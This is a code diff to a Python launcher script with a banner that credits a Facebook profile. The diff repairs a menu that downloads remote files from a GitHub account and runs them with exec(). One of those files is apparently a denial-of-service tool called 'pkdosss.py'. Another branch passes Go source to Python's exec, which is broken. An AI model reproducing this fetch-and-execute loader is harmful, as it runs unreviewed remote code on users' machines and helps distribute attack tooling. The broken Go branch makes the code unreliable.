@@ -5,6 +5,7 @@ import json
 import random
 from time import sleep
 import threading
+import requests
 from time import strftime
 
 try:
@@ -30,10 +31,6 @@ def banner():
        ║         facebook.com/100047128875560                ║
        ╚═════════════════════════════════════════════════════╝
 ''')
-
-s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
-r = "\033[1;97m▶▶\033[1;92m"
-sr = s+r+' '
 
 def ra(a):
     for i in range(len(a)):
@@ -71,11 +68,13 @@ def main():
 
     try:
         if abc == 1:
-            exec(requests.get("https://github.com/Kenne400k/nxt/blob/main/pkdosss.py").text)
+            code = requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pkdosss.py").text
+            exec(code)
         elif abc == 2:
-            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)
-    except:
-        pass
+            code = requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text
+            exec(code)
+    except Exception as e:
+        print("Đã xảy ra lỗi:", str(e))
 
 if __name__ == "__main__":
     main()
